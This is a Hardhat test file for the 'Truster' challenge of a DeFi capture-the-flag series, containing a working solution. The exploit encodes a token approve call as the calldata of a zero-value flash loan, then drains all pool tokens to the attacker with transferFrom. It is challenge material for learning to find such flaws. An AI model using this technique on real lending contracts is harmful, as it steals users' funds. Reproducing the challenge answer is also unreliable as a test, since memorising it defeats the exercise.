const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', async () => {
    let deployer, attacker;
    let token, pool;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    beforeEach(async () => {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        token = await DamnValuableToken.deploy();
        pool = await TrusterLenderPool.deploy(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
    });

    describe('Initial values', async () => {
        it('Pool starting balance should be correct', async () => {
            expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
        });

        it('Attacker balance should be zero', async () => {
            expect(await token.balanceOf(attacker.address)).to.equal('0');
        });
    });

    describe('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        beforeEach(async () => {
            const ABI = ["function approve(address, uint256)"];
            const interface = new ethers.utils.Interface(ABI);
            const payload = interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL.toString()])
            await pool.connect(attacker).flashLoan(0, attacker.address, token.address, payload);
            await token.connect(attacker).transferFrom(pool.address, attacker.address, TOKENS_IN_POOL);
        });

        it('Pool ending balance is 0', async () => {
            expect(await token.balanceOf(pool.address)).to.equal('0');
        });

        it('Attacker has taken all tokens from the pool', async () => {
            expect(await token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
        });
    });
});

